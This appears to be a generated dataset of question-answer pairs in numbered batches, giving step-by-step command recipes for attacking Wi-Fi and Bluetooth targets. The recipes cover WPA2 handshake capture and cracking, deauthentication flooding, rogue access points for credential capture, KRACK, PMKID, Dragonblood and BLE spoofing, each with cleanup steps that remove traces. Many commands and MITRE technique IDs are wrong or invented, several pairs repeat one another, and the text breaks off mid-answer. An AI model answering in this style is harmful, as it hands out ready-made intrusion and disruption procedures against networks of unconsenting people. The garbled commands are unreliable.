**Artifacts:**  
- Captured BLE packets.
- Discovered services and characteristics.

**Cleanup:**  
No additional cleanup is necessary for hcidump or gatttool.

=== BATCH 29 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the WPA2 handshake:**
```bash
# Start capturing packets on the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Crack the captured WPA2 handshake:**
```bash
# Convert the .cap file to .hccapx format (if needed)
aircrack-ng capture-01.cap --hc2john > output.john

# Use john to crack the password
john --wordlist=rockyou.txt output.john
```

**Artifacts:**
- Captured handshake in `.cap` or `.hccapx` format.
- Cracked password from `john`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-01.cap output.john
```
===PAIR===
Q: Can you explain how to perform a KRACK attack on a WPA2 network?
A: **Technique: Key Reinstallation Attacks (KRACK) — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture packets and deauthenticate the client:**
```bash
# Start capturing packets on the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Perform the KRACK attack:**
```bash
# Use aireplay-ng to inject packets and trigger the reinstallation of the same key
sudo aireplay-ng --replay=1 --count=<number_of_packets> -a <BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Captured packets in `.cap` format.
- Potential retransmissions or packet loss indicating the attack.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-01.cap
```
===PAIR===
Q: What is a PMKID attack, and how can I use it to crack WPA2 passwords?
A: **Technique: Pre-authenticated Key Identifier (PMKID) Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture PMKIDs:**
```bash
# Start capturing packets on the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Crack the captured PMKIDs:**
```bash
# Convert the .cap file to .hccapx format (if needed)
aircrack-ng capture-01.cap --hc2john > output.john

# Use john to crack the password
john --wordlist=rockyou.txt output.john
```

**Artifacts:**
- Captured PMKIDs in `.cap` or `.hccapx` format.
- Cracked password from `john`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-01.cap output.john
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture packets and deauthenticate the client:**
```bash
# Start capturing packets on the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write capture

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Perform the Dragonblood attack:**
```bash
# Use hcxpcapngtool to extract PMKIDs or PTKs from the capture file
hcxpcapngtool -z output.kix -k output.pmkid capture-01.cap

# Crack the extracted keys using hashcat
hashcat -m 25470 output.kix rockyou.txt
```

**Artifacts:**
- Captured packets in `.cap` format.
- Extracted PMKIDs or PTKs in `.kix` or `.pmkid` format.
- Cracked password from `hashcat`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-01.cap output.kix output.pmkid
```
===PAIR===
Q: What is a WPA/WPA2 deauthentication attack, and how can I use it to disrupt network traffic?
A: **Technique: WPA/WPA2 Deauthentication Attack — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
# Note: BSSID, channel, ESSID of target network, client MAC addresses
```

**Step 2 — Perform the deauthentication attack:**
```bash
# Deauthenticate all clients to disrupt traffic
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon

# Optionally, deauthenticate a specific client
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Disrupted network traffic (clients may reconnect multiple times).
- Potential loss of data transmission during the attack.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to capture client credentials?
A: **Technique: Rogue Access Point Setup — T1590.001**

**Step 1 — Configure the network interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set another interface as AP (e.g., wlan1)
sudo ip link set wlan1 up
```

**Step 2 — Start the rogue access point:**
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd and dnsmasq
sudo systemctl start hostapd
sudo systemctl start dnsmasq
```

**Step 3 — Capture client credentials:**
```bash
# Use airodump-ng to capture packets
sudo airodump-ng wlan0mon --bssid <BSSID> --write rogue_capture

# Deauthenticate clients to force reconnection
sudo aireplay-ng -deauth 10 -a <BSSID> wlan0mon
```

**Artifacts:**
- Captured packets in `.cap` format.
- Potential client credentials from captured handshakes.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
rm /etc/hostapd/hostapd.conf rogue_capture*
```

=== BATCH 30 RETRY 0 ===
===PAIR===
Q: How can I capture the WPA2 handshake between a client and an access point?
A: **Technique: WPA2 Handshake Capture — T1595.001**

**Step 1 — Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture Handshake:**  
```bash
# Start capturing packets on the identified channel and BSSID
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write output
```

**Artifacts:**  
- `output.cap` file containing captured packets, including handshakes.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm output.*
```
===PAIR===
Q: What is a good way to perform deauthentication attacks on WPA/WPA2 networks?
A: **Technique: WPA/WPA2 Deauthentication Attacks — T1595.001**

**Step 1 — Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt wpa,wep,none
# Note: BSSID, channel, ESSID, and client MAC addresses of the target network
```

**Step 2 — Perform Deauthentication:**  
```bash
# Send deauthentication packets to all clients on the network
sudo aireplay-ng -0 10 -a <BSSID> -c FF:FF:FF:FF:FF:FF wlan0mon
```

**Artifacts:**  
- Network downtime for the affected clients.
- Increased packet loss in network monitoring tools.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to intercept client traffic?
A: **Technique: Rogue Access Point Setup — T1590.001**

**Step 1 — Configure Wireless Adapter:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set another interface as the AP
sudo ip link set wlan1 up
```

**Step 2 — Start the Access Point:**  
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd and dnsmasq
sudo hostapd /etc/hostapd/hostapd.conf &
sudo dnsmasq --interface=wlan1 --dhcp-range=192.168.10.1,192.168.10.50,255.255.255.0
```

**Artifacts:**  
- Clients connecting to "RogueWiFi" instead of the intended network.
- Captured packets on wlan0mon.

**Cleanup:**  
```bash
sudo killall hostapd dnsmasq
sudo ip link set wlan1 down
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a KRACK attack, and how can I perform it?
A: **Technique: Key Reinstallation Attacks (KRACK) — T1595.001**

**Step 1 — Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture Packets:**  
```bash
# Start capturing packets on the identified channel and BSSID
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write output
```

**Step 3 — Perform KRACK Attack:**  
```bash
# Use aireplay to force retransmission of data frames
sudo aireplay-ng -r output.cap wlan0mon
```

**Artifacts:**  
- Repeated packets in the capture file, indicating potential key reinstallation.
- Network performance degradation for affected clients.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm output.*
```
===PAIR===
Q: How can I perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance — T1546**

**Step 1 — Scan for Networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a full scan to identify all networks
sudo airodump-ng wlan0mon --scan
```

**Step 2 — Map Channels and Frequencies:**  
```bash
# Use nmap for more detailed information, including device types
nmap -sn -PR 192.168.1.0/24
```

**Artifacts:**  
- `airodump-ng` output file with network details (BSSID, ESSID, channel, encryption).
- Nmap scan results indicating devices on the network.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a PMKID attack, and how can I use it to crack WPA2 passwords?
A: **Technique: Pre-shared Key Identifier (PMKID) Attack — T1595.001**

**Step 1 — Capture PMKIDs:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Start capturing packets and PMKIDs
sudo airodump-ng --bssid <BSSID> --channel <channel> -w output wlan0mon
```

**Step 2 — Crack the Password:**  
```bash
# Use hashcat to crack the captured PMKID
hashcat -m 16800 output-01.kismet.nettxt wordlist.txt
```

**Artifacts:**  
- `output-01.kismet.nettxt` file containing captured PMKIDs.
- Cracked passwords from hashcat.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm output.*
```

=== BATCH 31 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**  
```bash
# Start capturing packets on the target channel and BSSID
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate a client to force a new handshake:**  
```bash
# Force client to reconnect
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop the capture and crack the password:**  
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured handshake using John the Ripper or Hashcat
john --wordlist=wordlist.txt capture-01.cap
# Or with Hashcat:
hashcat -m 2500 capture-01.cap wordlist.txt
```

**Artifacts:**  
- Captured .cap file containing the WPA2 handshake.
- Cracked password from John or Hashcat output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to detect and analyze Bluetooth Low Energy (BLE) devices in a network?
A: **Technique: BLE Device Scanning \u2014 T1590.001**

**Step 1 \u2014 Install necessary tools:**  
```bash
sudo apt install bluetooth bluez-tools
```

**Step 2 \u2014 Scan for BLE devices:**  
```bash
# Start scanning
hcitool lescan
# Or with more details:
bluetoothctl scan on
```

**Expected Artifacts/Telemetry:**  
- List of BLE device MAC addresses and names.
- Potential services or characteristics advertised by the devices.

**Cleanup:**  
No specific cleanup needed, but you can stop scanning manually if desired.

===PAIR===
Q: How can I perform a KRACK attack to reinstall the key in a WPA2 network?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthenticate and capture packets:**  
```bash
# Start capturing packets on the target channel and BSSID
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Force a key reinstall by deauthenticating clients:**  
```bash
# Deauthenticate all connected clients to force key reinstallation
sudo aireplay-ng -0 5 -a <target_BSSID> wlan0mon
```

**Expected Artifacts/Telemetry:**  
- Captured .cap file containing packets with the same nonce.
- Potential impact on client connectivity and data integrity.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I use PMKID attacks to quickly crack WPA2 passwords?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets on the target channel and BSSID
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate to force PMKID calculation:**  
```bash
# Force client to reconnect
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop the capture and crack the PMKIDs:**  
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured PMKIDs using Hashcat
hashcat -m 16800 capture-01.cap wordlist.txt
```

**Artifacts:**  
- Captured .cap file containing PMKIDs.
- Cracked passwords from Hashcat output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack to gain access to a WPA3 network?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture packets:**  
```bash
# Start capturing packets on the target channel and BSSID
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate to force Dragonblood attack:**  
```bash
# Force client to reconnect
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop the capture and crack the password:**  
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured WPA3 packets using Hashcat
hashcat -m 19675 capture-01.cap wordlist.txt
```

**Artifacts:**  
- Captured .cap file containing WPA3 packets.
- Cracked passwords from Hashcat output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I use wireless network reconnaissance to map out the surrounding area?
A: **Technique: Wireless Network Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a comprehensive scan
sudo airodump-ng wlan0mon --scan
```

**Expected Artifacts/Telemetry:**  
- List of detected SSIDs, BSSIDs, channels, and signal strengths.
- Potential security settings (WPA2, WEP, etc.).

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
These pairs cover various attack subtopics across different MITRE IDs and provide detailed steps, commands, expected artifacts, and cleanup instructions.

=== BATCH 32 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake to attempt offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (Offline Cracking)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w capture
```

**Step 3 \u2014 Wait for a handshake:**
- The output will show when a handshake is captured (e.g., "WPA handshake from").
- Press `Ctrl+C` to stop capturing.

**Artifacts:**
- Handshake file saved as `capture-<BSSID>.cap`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: What is a good way to perform wireless network reconnaissance?
A: **Technique: Wireless Network Reconnaissance \u2014 T1590.001 (Network Mapping)**

**Step 1 \u2014 Scan for available networks:**
```bash
sudo nmap -sn --script broadcast-dhcp-discover
```

**Step 2 \u2014 Use `iwlist` to get more detailed information:**
```bash
sudo iwlist wlan0 scan | grep -i "essid\|quality"
```

**Artifacts:**
- List of SSIDs, BSSIDs, signal strengths, and other network details.

**Cleanup:**
No specific cleanup required unless wireless interface was changed.

===PAIR===
Q: How can I perform a KRACK attack on WPA2?
A: **Technique: KRACK Attack \u2014 T1595.001 (Key Reinstallation Attacks)**

**Step 1 \u2014 Identify the target device and network:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Deauthenticate the client to force reassociation:**
```bash
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture packets and check for reinstallation of the same key:**
- Use `tcpdump` or Wireshark to analyze the traffic.
- Look for duplicate key indices in the 4-way handshake.

**Artifacts:**
- Repeated key indices in the captured packets.
- Possible session hijacking or data integrity issues.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: Can you explain what a PMKID attack is and how to perform it?
A: **Technique: PMKID Attack \u2014 T1595.001 (Offline Cracking)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing PMKIDs:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w pmkid_capture
```

**Step 3 \u2014 Wait for PMKIDs to be captured:**
- The output will show when PMKIDs are collected.
- Press `Ctrl+C` to stop capturing.

**Step 4 \u2014 Crack the PMKID using hashcat:**
```bash
hashcat -m 16800 pmkid_capture-<BSSID>.cap wordlist.txt
```

**Artifacts:**
- Captured PMKIDs saved as `pmkid_capture-<BSSID>.cap`.
- Cracked passwords from the wordlist.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: How can I set up a rogue access point to capture client data?
A: **Technique: Rogue Access Point \u2014 T1590.001 (Rogue AP)**

**Step 1 \u2014 Configure the wireless interface:**
```bash
sudo ip link set wlan1 up
```

**Step 2 \u2014 Set the SSID and start the access point:**
```bash
sudo hostapd -B /etc/hostapd/hostapd.conf
```
- Example configuration in `/etc/hostapd/hostapd.conf`:
  ```
  interface=wlan1
  driver=nl80211
  ssid=RogueWiFi
  hw_mode=g
  channel=6
  wpa=2
  wpa_passphrase=password123
  wpa_key_mgmt=WPA-PSK
  rsn_pairwise=CCMP
  ```

**Step 3 \u2014 Start DHCP and DNS services:**
```bash
sudo dnsmasq -i wlan1
```

**Artifacts:**
- Clients connecting to `RogueWiFi` will use the provided password.
- Captured data can be analyzed for credentials or other information.

**Cleanup:**
```bash
sudo killall hostapd
sudo killall dnsmasq
```

===PAIR===
Q: What is an example of a Bluetooth Low Energy (BLE) attack?
A: **Technique: BLE Advertising Spoofing \u2014 T1590.001 (Advertising Spoofing)**

**Step 1 \u2014 Scan for nearby BLE devices:**
```bash
sudo hcitool lescan --active
```

**Step 2 \u2014 Stop the scan and pair with a target device:**
```bash
sudo bluetoothctl
# Commands in bluetoothctl:
pair <target_MAC>
trust <target_MAC>
connect <target_MAC>
```

**Step 3 \u2014 Spoof the advertising data of the target device:**
```bash
sudo gatttool -b <target_MAC> --char-write-req -a 0x0009 -n "spoofeddata"
```

**Artifacts:**
- Target device may connect to the spoofed name or service.
- Applications using BLE for authentication or data exchange might be affected.

**Cleanup:**
```bash
sudo bluetoothctl disconnect <target_MAC>
sudo bluetoothctl remove <target_MAC>
```

=== BATCH 33 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture Handshake:**  
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate Client to Force Reassociation:**  
```bash
# Deauthenticate a client to force it to retransmit the handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop Capture and Crack Handshake:**  
```bash
# Stop the capture process
killall airodump-ng

# Use a wordlist to crack the captured handshake
aircrack-ng -w wordlist.txt capture-01.cap
```

**Artifacts:**  
- Captured `.cap` file containing the WPA2 handshake.
- Cracked password from `aircrack-ng`.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture-01*
```
===PAIR===
Q: What is a method to detect and analyze Bluetooth Low Energy (BLE) devices in a target area?
A: **Technique: BLE Device Scanning \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE Devices:**  
```bash
# Use `hcitool` to scan for nearby BLE devices
sudo hcitool lescan
```

**Step 2 \u2014 Gather More Information:**  
```bash
# Use `bluetoothctl` for more detailed information and services
sudo bluetoothctl
[agent] default-agent
[bluetooth] power on
[bluetooth] scan on

# Discover devices, then connect to a specific device for details
[bluetooth] info <device_address>
```

**Artifacts:**  
- List of BLE device addresses and names.
- Detailed information about connected devices.

**Cleanup:**  
```bash
sudo bluetoothctl
[bluetooth] power off
[bluetooth] scan off
```
===PAIR===
Q: How can I perform a KRACK attack on a WPA2 network?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Deauthenticate Client:**  
```bash
# Deauthenticate a client to initiate reassociation and KRACK attack
sudo aireplay-ng -deauth 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture Packets:**  
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 4 \u2014 Analyze and Verify KRACK Attack:**  
```bash
# Stop the capture process
killall airodump-ng

# Use `tcpdump` to analyze packets for retransmissions
sudo tcpdump -r capture-01.cap | grep "Replay"
```

**Artifacts:**  
- Captured `.cap` file containing packets.
- Evidence of packet retransmissions indicating KRACK attack.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture-01*
```
===PAIR===
Q: Can you describe a method to perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for Networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a full scan of all networks
sudo airodump-ng wlan0mon
```

**Step 2 \u2014 Detailed Network Information:**  
```bash
# Use `kismet` for detailed network mapping and analysis
sudo kismet -c <channel> -b <BSSID>
```

**Artifacts:**  
- List of detected SSIDs, BSSIDs, channels, encryption types.
- Maps and visualizations of wireless coverage.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo pkill kismet
```
===PAIR===
Q: How can I set up a rogue access point to capture client credentials?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure Wireless Adapter:**  
```bash
# Put wireless adapter in monitor mode and start AP interface
sudo airmon-ng start wlan0
sudo iwconfig wlan0mon essid "FreeWiFi" channel 6
```

**Step 2 \u2014 Start DHCP Server and DNSmasq:**  
```bash
# Install `dnsmasq` if not already installed
sudo apt install dnsmasq

# Configure `dnsmasq`
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.1.10,192.168.1.50,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
EOF

# Start `dnsmasq`
sudo dnsmasq -C /tmp/dnsmasq.conf
```

**Step 3 \u2014 Capture Client Credentials:**  
```bash
# Use `tcpdump` to capture credentials
sudo tcpdump -i wlan0mon -w captured_credentials.pcap
```

**Artifacts:**  
- Captured `.pcap` file containing client traffic.
- Possible credentials and data from connected clients.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo pkill dnsmasq
rm /tmp/dnsmasq.conf
```
===PAIR===
Q: What is a method to perform PMKID attacks for WPA2?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate Client to Force PMKID:**  
```bash
# Deauthenticate a client to force it to retransmit the PMKID
sudo aireplay-ng -deauth 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop Capture and Crack PMKIDs:**  
```bash
# Stop the capture process
killall airodump-ng

# Use `aircrack-ng` to crack the captured PMKIDs
aircrack-ng -w wordlist.txt capture-01.cap
```

**Artifacts:**  
- Captured `.cap` file containing PMKIDs.
- Cracked password from `aircrack-ng`.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture-01*
```

=== BATCH 34 RETRY 0 ===
===PAIR===
Q: How can I capture WPA2 handshakes for offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note the BSSID, channel, and ESSID of the target network.
```

**Step 3 \u2014 Start capturing handshakes:**
```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Expected Artifacts/Telemetry:**
- Captured .cap files in the current directory.
- Wireshark can be used to verify if handshakes are captured.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good way to perform wireless network reconnaissance?
A: **Technique: Wireless Network Reconnaissance \u2014 T1590.001**

**Step 1 \u2014 Scan for networks:**
```bash
sudo nmap -sn --script broadcast-dns-sd-discover
```

**Step 2 \u2014 Detailed network analysis:**
```bash
sudo airodump-ng wlan0mon
```

**Expected Artifacts/Telemetry:**
- List of detected networks, including SSIDs, BSSIDs, channels, and encryption types.
- Potential hidden or less obvious networks.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a deauthentication attack on WPA/WPA2 clients?
A: **Technique: Deauthentication Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network and clients:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note the BSSID, channel, and MAC addresses of the target clients.
```

**Step 3 \u2014 Perform deauthentication attack:**
```bash
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Clients disconnect and reconnect to the network.
- Network monitoring tools show increased activity or changes.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point during penetration testing?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure wireless interface:**
```bash
sudo ip link set wlan1 down
sudo iwconfig wlan1 mode managed
sudo ip link set wlan1 up
```

**Step 2 \u2014 Install and configure hostapd:**
```bash
sudo apt install hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Start the rogue access point:**
```bash
sudo hostapd /etc/hostapd/hostapd.conf
```

**Expected Artifacts/Telemetry:**
- New SSID "RogueWiFi" visible in wireless scans.
- Clients may try to connect, depending on signal strength.

**Cleanup Steps:**
```bash
sudo systemctl stop hostapd
```
===PAIR===
Q: How can I perform a PMKID attack for WPA2?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Discover target network and clients:**
```bash
sudo airodump-ng wlan0mon --encrypt wpa2
# Note the BSSID, channel, and MAC addresses of the target clients.
```

**Step 3 \u2014 Capture PMKIDs:**
```bash
